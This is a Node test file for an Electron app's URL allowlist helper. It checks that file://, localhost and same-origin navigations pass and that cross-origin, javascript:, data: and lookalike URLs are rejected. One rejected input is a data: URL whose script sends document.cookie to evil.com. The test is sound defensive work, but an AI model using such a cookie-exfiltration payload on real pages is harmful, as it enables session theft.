// Tests for the navigation-allowlist helper. The Electron-specific bits
// (CSP header injection, will-navigate / setWindowOpenHandler wiring) are
// tested at runtime via L4 — they need a real BrowserWindow. The pure URL
// classifier IS testable here, and it's the trust boundary for what the
// renderer can navigate to.
//
// L2 acceptance criteria for TASK-042:
//  - file:// always allowed (packaged renderer)
//  - localhost (any port) always allowed (Vite dev server + HMR)
//  - same-origin navigations allowed
//  - everything else rejected, especially attacker-controlled origins

import { test } from 'node:test'
import assert from 'node:assert/strict'
import { isAllowedRendererUrl } from '../src/main/services/security-helpers.ts'

const FILE_URL = 'file:///C:/Users/foo/app/out/renderer/index.html'
const DEV_URL = 'http://localhost:5173/index.html'

test('isAllowedRendererUrl: about:blank is always allowed', () => {
  assert.equal(isAllowedRendererUrl(FILE_URL, 'about:blank'), true)
})

test('isAllowedRendererUrl: file:// to file:// is allowed', () => {
  assert.equal(
    isAllowedRendererUrl(FILE_URL, 'file:///C:/Users/foo/app/out/renderer/windows/result/x.html'),
    true
  )
})

test('isAllowedRendererUrl: localhost http is allowed (Vite dev server)', () => {
  assert.equal(isAllowedRendererUrl(DEV_URL, 'http://localhost:5173/some/path'), true)
  assert.equal(isAllowedRendererUrl(DEV_URL, 'http://localhost:8080/'), true)
})

test('isAllowedRendererUrl: localhost ws is allowed (Vite HMR)', () => {
  assert.equal(isAllowedRendererUrl(DEV_URL, 'ws://localhost:5173/__vite_ping'), true)
})

test('isAllowedRendererUrl: same-origin navigation is allowed', () => {
  assert.equal(
    isAllowedRendererUrl(
      'https://example.com/page1',
      'https://example.com/page2'
    ),
    true
  )
})

test('isAllowedRendererUrl: cross-origin http is REJECTED (the main attack)', () => {
  assert.equal(isAllowedRendererUrl(FILE_URL, 'https://evil.com/'), false)
  assert.equal(isAllowedRendererUrl(FILE_URL, 'http://attacker.com/'), false)
})

test('isAllowedRendererUrl: javascript: scheme is REJECTED', () => {
  assert.equal(isAllowedRendererUrl(FILE_URL, 'javascript:alert(1)'), false)
})

test('isAllowedRendererUrl: data: URLs are REJECTED (could host arbitrary HTML)', () => {
  assert.equal(
    isAllowedRendererUrl(FILE_URL, 'data:text/html,<script>fetch("//evil.com/"+document.cookie)</script>'),
    false
  )
})

test('isAllowedRendererUrl: file:// from a non-file:// page is allowed (packaged → packaged is fine; regression check)', () => {
  // We allow file:// regardless of source — the more dangerous direction
  // (file → web) is rejected by the cross-origin check.
  assert.equal(isAllowedRendererUrl('http://localhost:5173/', 'file:///C:/foo.html'), true)
})

test('isAllowedRendererUrl: malformed URLs are rejected (defensive)', () => {
  assert.equal(isAllowedRendererUrl(FILE_URL, 'not a url at all'), false)
  assert.equal(isAllowedRendererUrl(FILE_URL, ''), false)
})

test('isAllowedRendererUrl: localhost-lookalike attacks are REJECTED', () => {
  // attacker registers a domain like "localhost.evil.com" hoping a sloppy
  // regex would accept it. Our regex anchors at the start.
  assert.equal(isAllowedRendererUrl(DEV_URL, 'http://localhost.evil.com/'), false)
  assert.equal(isAllowedRendererUrl(DEV_URL, 'http://evil.com/?host=localhost'), false)
})
